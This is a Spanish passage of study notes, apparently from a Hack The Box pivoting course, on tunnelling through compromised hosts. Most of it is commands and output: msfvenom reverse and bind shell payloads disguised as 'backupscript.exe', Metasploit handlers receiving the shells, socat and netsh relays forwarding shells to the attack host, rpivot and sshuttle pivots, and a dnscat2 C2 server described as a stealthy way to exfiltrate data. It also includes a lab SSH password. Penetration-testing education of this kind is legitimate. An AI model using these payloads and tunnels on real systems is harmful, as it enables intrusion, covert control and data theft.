Podemos usar Netstat para ver información sobre la sesión que establecimos recientemente. Desde una perspectiva defensiva, podemos beneficiarnos del uso de Netstat si sospechamos que un anfitrión ha sido comprometido. Esto nos permite ver cualquier sesión que un anfitrión haya establecido.

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
vcrdcr@htb[/htb]$ netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```



## Meterpreter Reverse Port Forwarding

Similar a los reenvíos de puertos locales, Metasploit también puede funcionar `reverse port forwarding` con el siguiente comando, donde es posible que desee escuchar en un puerto específico en el servidor comprometido y reenviar todos los shells entrantes desde el servidor Ubuntu a nuestro host de ataque. Iniciaremos un oyente en un nuevo puerto en nuestro host de ataque para Windows y solicitaremos al servidor de Ubuntu que reenvíe todas las solicitudes recibidas al servidor de Ubuntu en el puerto `1234` a nuestro oyente en el puerto `8081`.

Podemos crear un puerto inverso hacia adelante en nuestro shell existente desde el escenario anterior utilizando el siguiente comando. Este comando reenvía todas las conexiones en el puerto `1234` ejecutar en el servidor Ubuntu a nuestro host de ataque en el puerto local (`-l`) `8081`. También configuraremos nuestro oyente para que escuche en el puerto 8081 para un shell de Windows.

#### Reglas de Reenvío de Puerto Inverso

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

#### Configuración e inicio de multi/manipulador

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

Ahora podemos crear una carga útil de shell inverso que enviará una conexión a nuestro servidor Ubuntu en `172.16.5.129`:`1234` cuando se ejecuta en nuestro host de Windows. Una vez que nuestro servidor Ubuntu reciba esta conexión, la reenviará a `attack host's ip`:`8081` que configuramos.

#### Generando la carga útil de Windows

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Finalmente, si ejecutamos nuestra carga útil en el host de Windows, deberíamos poder recibir un shell de Windows pivotado a través del servidor Ubuntu.

#### Establecimiento de la sesión Meterpreter

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```



# ----- Pong with Socat -----

# Socat Redirection with a Reverse Shell

[Sócate](https://linux.die.net/man/1/socat) es una herramienta de relé bidireccional que puede crear tomas de tubería entre `2` canales de red independientes sin necesidad de utilizar túneles SSH. Actúa como un redirector que puede escuchar en un host y puerto y reenviar esos datos a otra dirección IP y puerto. Podemos iniciar el oyente de Metasploit usando el mismo comando mencionado en la última sección de nuestro host de ataque, y podemos comenzar `socat` en el servidor de Ubuntu.

ESTO REALIZA UNA REVERSE SHELL QUE ENVIA LA MAQUINA WINDOWS A LA MAQUINA UBUNTU (PIVOT) Y ESTA REDIRECCIONA EL PAQUETE A LA MAQUINA ATACANTE

#### Iniciando Socat Listener

  Redirección de Socat con una Concha Inversa

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat escuchará en localhost en el puerto `8080` y reenvíe todo el tráfico al puerto `80` en nuestro anfitrión de ataque (10.10.14.18). Una vez que nuestro redirector está configurado, podemos crear una carga útil que se conectará de nuevo a nuestro redirector, que se ejecuta en nuestro servidor Ubuntu. También iniciaremos un oyente en nuestro host de ataque porque tan pronto como socat reciba una conexión de un objetivo, redirigirá todo el tráfico al oyente de nuestro host de ataque, donde obtendríamos un shell.

#### Creación de la carga útil de Windows

  Redirección de Socat con una Concha Inversa

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Tenga en cuenta que debemos transferir esta carga útil al host de Windows. Podemos utilizar algunas de las mismas técnicas utilizadas en secciones anteriores para hacerlo.


#### Inicio de la consola MSF

  Redirección de Socat con una Concha Inversa

```shell-session
vcrdcr@htb[/htb]$ sudo msfconsole

<SNIP>
```

#### Configuración e inicio del manipulador múltiple/manipulador

  Redirección de Socat con una Concha Inversa

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

#### Establecimiento de la Sesión Meterpreter

  Redirección de Socat con una Concha Inversa

```shell-session
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```



# Socat Redirection with a Bind Shell

En el caso de los shells de enlace, el servidor de Windows iniciará un oyente y se vinculará a un puerto en particular. Podemos crear una carga útil de shell de enlace para Windows y ejecutarla en el host de Windows. Al mismo tiempo, podemos crear un redirector de socat en el servidor Ubuntu, que escuchará las conexiones entrantes de un controlador de enlaces Metasploit y las reenviará a una carga útil de shell de enlace en un objetivo de Windows. La siguiente figura debería explicar el pivote de una manera mucho mejor.

![Diagrama que muestra la configuración de la red: Attack Host (10.10.15.5) utiliza Metasploit Handler. Victim Server (Ubuntu) escucha en el puerto 8080, reenvía a 172.16.5.19:8443. Victim Server (Windows A) tiene un Bind Shell en el puerto 8443.](https://academy.hackthebox.com/storage/modules/158/55.png)

Podemos crear un shell de enlace usando msfvenom con el siguiente comando.


#### Creación de la carga útil de Windows

  Redirección de Socat con un Bind Shell

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

Podemos empezar un `socat bind shell` oyente, que escucha en el puerto `8080` y reenvía paquetes al servidor de Windows `8443`.


#### Inicio Socat Bind Shell Listener

  Redirección de Socat con un Bind Shell

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```


Finalmente, podemos iniciar un controlador Metasploit bind. Este manejador de enlaces se puede configurar para conectarse al oyente de nuestro socat en el puerto 8080 (Ubuntu server)

#### Configuración e inicio del manipulador multi/Bind

  Redirección de Socat con un Bind Shell

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

Podemos ver un manejador de enlaces conectado a una solicitud de etapa pivotada a través de un oyente de socat al ejecutar la carga útil en un objetivo de Windows.


#### Establecimiento de la Sesión Meterpreter

  Redirección de Socat con un Bind Shell

```shell-session
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```



# --- Pivoting Alrededor de los Obstáculos ---

# SSH for Windows: plink.exe  (PIVOTAR CON WIN)


[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html), abreviatura de PuTTY Link, es una herramienta SSH de línea de comandos de Windows que viene como parte del paquete PuTTY cuando se instala. Similar a SSH, Plink también se puede utilizar para crear reenvíos de puertos dinámicos y proxies SOCKS.

Imagine que estamos en un pentest y obtenemos acceso a una máquina con Windows. Rápidamente enumeramos el host y su postura de seguridad y determinamos que está moderadamente bloqueado. Necesitamos usar este host como punto de pivote, pero es poco probable que podamos tirar de nuestras propias herramientas en el host sin estar expuestos. En cambio, podemos vivir de la tierra y usar lo que ya está allí. Si el host es más antiguo y PuTTY está presente (o podemos encontrar una copia en un archivo compartido), Plink puede ser nuestro camino hacia la victoria. Podemos usarlo para crear nuestro pivote y potencialmente evitar la detección un poco más.


## Conociendo Plink

En la siguiente imagen, tenemos un host de ataque basado en Windows.

![Diagrama que muestra la configuración de red: Windows (10.10.15.5) reenvía el puerto remoto 8080 al puerto local 80 utilizando Plink SSH Client. Stark SOCKS Listener en el puerto 9050 reenvía paquetes. Servidor de Víctimas (Ubuntu) y Servidor de Víctimas (Windows A) con Servicio RDP en 172.16.5.19.](https://academy.hackthebox.com/storage/modules/158/66-1.png)

El host de ataque de Windows inicia un proceso plink.exe con los siguientes argumentos de línea de comandos para iniciar un puerto dinámico hacia adelante sobre el servidor Ubuntu. Esto inicia una sesión SSH entre el host de ataque de Windows y el servidor Ubuntu, y luego plink comienza a escuchar en el puerto 9050.

#### Usando Plink.exe

  SSH para Windows: plink.exe

```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```


Otra herramienta basada en Windows llamada [Proxificador](https://www.proxifier.com/) se puede utilizar para iniciar un túnel SOCKS a través de la sesión SSH que creamos. Proxifier es una herramienta de Windows que crea una red tunelizada para aplicaciones de cliente de escritorio y le permite operar a través de un proxy SOCKS o HTTPS y permite el encadenamiento de proxy. Es posible crear un perfil donde podamos proporcionar la configuración para nuestro servidor SOCKS iniciado por Plink en el puerto 9050.

  
![Ventana de configuración del proxificador que muestra la lista de Servidores Proxy con entrada: Dirección 127.0.0.1, Puerto 9050, Tipo SOCKS4. Se abre el cuadro de diálogo de configuración de Proxy Server para la dirección, el puerto, el protocolo y la autenticación.](https://academy.hackthebox.com/storage/modules/158/reverse_shell_9.png)

Después de configurar el servidor SOCKS para `127.0.0.1` y el puerto 9050, podemos comenzar directamente `mstsc.exe` para iniciar una sesión RDP con un objetivo de Windows que permite conexiones RDP.

Nota: Podemos intentar esta técnica en cualquier sección interactiva de este módulo desde un host de ataque personal basado en Windows. Una vez que haya completado este módulo desde un host de ataque basado en Linux, no dude en intentar volver a través de él desde un host de ataque personal basado en Windows. Además, al generar su objetivo, le pedimos que espere de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurado para que la conexión a su objetivo funcione sin problemas.


# SSH Pivotando con Sshuttle (Herramienta buena)

[Sshuttle](https://github.com/sshuttle/sshuttle) es otra herramienta escrita en Python que elimina la necesidad de configurar proxychains. Sin embargo, esta herramienta solo funciona para pivotar sobre SSH y no proporciona otras opciones para pivotar sobre servidores proxy TOR o HTTPS. `Sshuttle` puede ser extremadamente útil para automatizar la ejecución de iptables y agregar reglas de pivote para el host remoto. Podemos configurar el servidor Ubuntu como un punto de pivote y enrutar todo el tráfico de red de Nmap con sshuttle utilizando el ejemplo más adelante en esta sección.

Un uso interesante de sshuttle es que no necesitamos usar proxychains para conectarnos a los hosts remotos. Instalemos sshuttle a través de nuestro host pivote de Ubuntu y configuremos para conectarnos al host de Windows a través de RDP.


#### Instalación de sshuttle

  SSH Pivotando con Sshuttle

```shell-session
vcrdcr@htb[/htb]$ sudo apt-get install sshuttle

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following packages were automatically installed and are no longer required:
  alsa-tools golang-1.15 golang-1.15-doc golang-1.15-go golang-1.15-src
  golang-1.16-src libcmis-0.5-5v5 libct4 libgvm20 liblibreoffice-java
  libmotif-common libqrcodegencpp1 libunoloader-java libxm4
  linux-headers-5.10.0-6parrot1-common python-babel-localedata
  python3-aiofiles python3-babel python3-fastapi python3-pydantic
  python3-slowapi python3-starlette python3-uvicorn sqsh ure-java
Use 'sudo apt autoremove' to remove them.
Suggested packages:
  autossh
The following NEW packages will be installed:
  sshuttle
0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.
Need to get 91.8 kB of archives.
After this operation, 508 kB of additional disk space will be used.
Get:1 https://ftp-stud.hs-esslingen.de/Mirrors/archive.parrotsec.org rolling/main amd64 sshuttle all 1.0.5-1 [91.8 kB]
Fetched 91.8 kB in 2s (52.1 kB/s) 
Selecting previously unselected package sshuttle.
(Reading database ... 468019 files and directories currently installed.)
Preparing to unpack .../sshuttle_1.0.5-1_all.deb ...
Unpacking sshuttle (1.0.5-1) ...
Setting up sshuttle (1.0.5-1) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for doc-base (0.11.1) ...
Processing 1 added doc-base file...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
```

Para usar sshuttle, especificamos la opción `-r` para conectarse a la máquina remota con un nombre de usuario y contraseña. Entonces necesitamos incluir la red o IP que queremos enrutar a través del host pivote, en nuestro caso, es la red 172.16.5.0/23.

#### Corriendo sshuttle

  SSH Pivotando con Sshuttle

```shell-session
vcrdcr@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 

Starting sshuttle proxy (version 1.1.0).
c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
fw: Starting firewall with Python version 3.9.2
fw: ready method name nat.
c : IPv6 enabled: Using default IPv6 listen address ::1
c : Method: nat
c : IPv4: on
c : IPv6: on
c : UDP : off (not available with nat method)
c : DNS : off (available)
c : User: off (available)
c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
c : Subnets to exclude from forwarding:
c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
c : TCP redirector listening on ('::1', 12300, 0, 0).
c : TCP redirector listening on ('127.0.0.1', 12300).
c : Starting client with Python version 3.9.2
c : Connecting to server...
ubuntu@10.129.202.64's password: 
 s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
 s: latency control setting = True
 s: auto-nets:False
c : Connected to server.
fw: setting up.
fw: ip6tables -w -t nat -N sshuttle-12300
fw: ip6tables -w -t nat -F sshuttle-12300
fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
fw: iptables -w -t nat -N sshuttle-12300
fw: iptables -w -t nat -F sshuttle-12300
fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
```


Con este comando, sshuttle crea una entrada en nuestro `iptables` para redirigir todo el tráfico a la red 172.16.5.0/23 a través del host pivote.

#### Enrutamiento de tráfico a través de rutas iptables

  SSH Pivotando con Sshuttle

```shell-session
vcrdcr@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:16
Completed Parallel DNS resolution of 1 host. at 11:16, 0.15s elapsed
Initiating Connect Scan at 11:16
Scanning 172.16.5.19 [1 port]
Completed Connect Scan at 11:16, 2.00s elapsed (1 total ports)
Initiating Service scan at 11:16
NSE: Script scanning 172.16.5.19.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Nmap scan report for 172.16.5.19
Host is up.

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: inlanefreight.local
|   DNS_Computer_Name: DC01.inlanefreight.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-08-14T02:58:25+00:00
|_ssl-date: 2022-08-14T02:58:25+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=DC01.inlanefreight.local
| Issuer: commonName=DC01.inlanefreight.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-13T02:51:48
| Not valid after:  2023-02-12T02:51:48
| MD5:   58a1 27de 5f06 fea6 0e18 9a02 f0de 982b
|_SHA-1: f490 dc7d 3387 9962 745a 9ef8 8c15 d20e 477f 88cb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6s, deviation: 0s, median: 6s


NSE: Script Post-scanning.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.07 seconds
```

Ahora podemos usar cualquier herramienta directamente sin usar proxychains.


Nota: Al generar su objetivo, le pedimos que espere de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurado para que la conexión a su objetivo funcione sin problemas. SSH al objetivo con el usuario "`ubuntu`"y contraseña"`HTB_@cademy_stdnt!`"


# Web Server Pivoting with Rpivot

[Rpivote](https://github.com/klsecservices/rpivot) es una herramienta proxy SOCKS inversa escrita en Python para el túnel SOCKS. Rpivot vincula una máquina dentro de una red corporativa a un servidor externo y expone el puerto local del cliente en el lado del servidor. Tomaremos el escenario a continuación, donde tenemos un servidor web en nuestra red interna (`172.16.5.135`), y queremos acceder a eso usando el proxy rpivot.

Podemos iniciar nuestro servidor proxy SOCKS de rpivot utilizando el siguiente comando para permitir que el cliente se conecte en el puerto 9999 y escuche en el puerto 9050 para conexiones de pivote proxy.

#### Clonación rpivot

  Servidor Web Pivotando con Rpivot

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
```

#### Instalación de Python2.7

  Servidor Web Pivotando con Rpivot

```shell-session
vcrdcr@htb[/htb]$ sudo apt-get install python2.7
```


#### Instalación alternativa de Python2.7

  Servidor Web Pivotando con Rpivot

```shell-session
vcrdcr@htb[/htb]$ curl https://pyenv.run | bash
vcrdcr@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
vcrdcr@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
vcrdcr@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
vcrdcr@htb[/htb]$ source ~/.bashrc
vcrdcr@htb[/htb]$ pyenv install 2.7
vcrdcr@htb[/htb]$ pyenv shell 2.7
```


Podemos iniciar nuestro servidor proxy Rpivot SOCKS para conectarnos a nuestro cliente en el servidor de Ubuntu comprometido utilizando `server.py`.

#### Ejecución de server.py desde el host de ataque

  Servidor Web Pivotando con Rpivot

```shell-session
vcrdcr@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Antes de correr `client.py` tendremos que transferir rpivot al objetivo. Podemos hacer esto usando este comando SCP:

#### Transferencia de rpivot al Objetivo

  Servidor Web Pivotando con Rpivot

```shell-session
vcrdcr@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

#### Ejecución de client.py desde Pivot Target

  Servidor Web Pivotando con Rpivot

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

#### Confirmando la Conexión se Establece

  Servidor Web Pivotando con Rpivot

```shell-session
New connection from host 10.129.202.64, source port 35226
```

Configuraremos proxychains para pivotar sobre nuestro servidor local en 127.0.0.1:9050 en nuestro host de ataque, que inicialmente fue iniciado por el servidor Python.

Finalmente, deberíamos poder acceder al servidor web en nuestro lado del servidor, que está alojado en la red interna de 172.16.5.0/23 en 172.16.5.135:80 usando proxychains y Firefox.

#### Navegación al Servidor Web de destino utilizando Proxychains

  Servidor Web Pivotando con Rpivot

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

![Terminal que ejecuta ProxyChains con Firefox que se conecta a 172.16.5.135. El navegador muestra la página predeterminada de Apache2 Ubuntu, confirmando la configuración del servidor.](https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png)

Similar al proxy de pivote anterior, podría haber escenarios en los que no podamos pivotar directamente a un servidor externo (host de ataque) en la nube. Algunas organizaciones tienen [HTTP-proxy con autenticación NTLM](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configurado con el Controlador de Dominio. En tales casos, podemos proporcionar una opción de autenticación NTLM adicional a rpivot para autenticarse a través del proxy NTLM proporcionando un nombre de usuario y contraseña. En estos casos, podríamos usar el client.py de rpivot de la siguiente manera:

#### Conexión a un Servidor Web usando HTTP-Proxy & NTLM Auth

  Servidor Web Pivotando con Rpivot

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```


# Port Forwarding with Windows Netsh


[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) es una herramienta de línea de comandos de Windows que puede ayudar con la configuración de red de un sistema Windows en particular. Estas son solo algunas de las tareas relacionadas con la red que podemos usar `Netsh` para:

- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`

Tomemos un ejemplo del siguiente escenario en el que nuestro host comprometido es una estación de trabajo de administrador de TI basada en Windows 10 (`10.129.15.150`, `172.16.5.25`). Tenga en cuenta que es posible en un compromiso que podamos obtener acceso a la estación de trabajo de un empleado a través de métodos como la ingeniería social y el phishing. Esto nos permitiría girar más lejos de la red en la que se encuentra la estación de trabajo.

![Diagrama que muestra una solicitud RDP desde Attack Host (10.10.15.5) a Windows Server (172.16.5.25) a través de Windows10 User (10.129.15.150) usando Netsh.exe. La solicitud escucha en el puerto 8080 y reenvía al puerto 3389.](https://academy.hackthebox.com/storage/modules/158/88.png)

Podemos usar `netsh.exe` para reenviar todos los datos recibidos en un puerto específico (digamos 8080) a un host remoto en un puerto remoto. Esto se puede realizar usando el siguiente comando.

#### Usando Netsh.exe para Port Forward

  Reenvío de puertos con Windows Netsh

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```

#### Verificación de Puerto Adelante

  Reenvío de puertos con Windows Netsh

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```

Después de configurar el `portproxy` en nuestro host pivote basado en Windows, intentaremos conectarnos al puerto 8080 de este host desde nuestro host de ataque usando xfreerdp. Una vez que se envía una solicitud desde nuestro host de ataque, el host de Windows enrutará nuestro tráfico de acuerdo con la configuración de proxy configurada por netsh.exe.

#### Conexión al Anfitrión Interno a través del Puerto Adelante

![Terminal que muestra el comando xfreerdp que se conecta a 10.129.42.198:8080 con el usuario 'victor' y la contraseña 'pass@123'. A continuación, un Símbolo del sistema de Windows muestra la configuración IP para el adaptador Ethernet, que muestra la dirección IPv4 172.16.5.19.](https://academy.hackthebox.com/storage/modules/158/netsh_pivot.png)

---

Nota: Al generar su objetivo, le pedimos que espere de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurado para que la conexión a su objetivo funcione sin problemas.


# ---- Branching Fuera de Nuestros Túneles ----

# Túnel DNS con Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) es una herramienta de túnel que utiliza el protocolo DNS para enviar datos entre dos hosts. Utiliza un cifrado `Command-&-Control` (`C&C` o `C2`) canal y envía datos dentro de registros TXT dentro del protocolo DNS. Por lo general, cada entorno de dominio de directorio activo en una red corporativa tendrá su propio servidor DNS, que resolverá los nombres de host a las direcciones IP y enrutará el tráfico a servidores DNS externos que participan en el sistema DNS general. Sin embargo, con dnscat2, la resolución de dirección se solicita desde un servidor externo. Cuando un servidor DNS local intenta resolver una dirección, los datos se extraen y se envían a través de la red en lugar de una solicitud DNS legítima. Dnscat2 puede ser un enfoque extremadamente sigiloso para filtrar datos mientras evade las detecciones de firewall que eliminan las conexiones HTTPS y detectan el tráfico. Para nuestro ejemplo de prueba, podemos usar el servidor dnscat2 en nuestro host de ataque y ejecutar el cliente dnscat2 en otro host de Windows.

## Configuración y uso de dnscat2

Si dnscat2 aún no está configurado en nuestro host de ataque, podemos hacerlo utilizando los siguientes comandos:

#### Clonación de dnscat2 y Configuración del servidor

  Túnel DNS con Dnscat2

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Luego podemos iniciar el servidor dnscat2 ejecutando el archivo dnscat2.

#### Iniciar el servidor dnscat2

  Túnel DNS con Dnscat2

```shell-session
vcrdcr@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Después de ejecutar el servidor, nos proporcionará la clave secreta, que tendremos que proporcionar a nuestro cliente dnscat2 en el host de Windows para que pueda autenticar y cifrar los datos que se envían a nuestro servidor dnscat2 externo. Podemos usar el cliente con el proyecto dnscat2 o usar [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), un cliente basado en PowerShell compatible con dnscat2 que podemos ejecutar desde objetivos de Windows para establecer un túnel con nuestro servidor dnscat2. Podemos clonar el proyecto que contiene el archivo cliente a nuestro host de ataque, luego transferirlo al objetivo.

#### Clonación de dnscat2-powershell al Anfitrión de Ataque

  Túnel DNS con Dnscat2

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Una vez que el `dnscat2.ps1` el archivo está en el objetivo podemos importarlo y ejecutar cmd-lets asociados.


#### Importación de dnscat2.ps1

  Túnel DNS con Dnscat2

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

Después de importar dnscat2.ps1, podemos usarlo para establecer un túnel con el servidor que se ejecuta en nuestro host de ataque. Podemos enviar una sesión de shell CMD a nuestro servidor.

  Túnel DNS con Dnscat2

```powershell-session
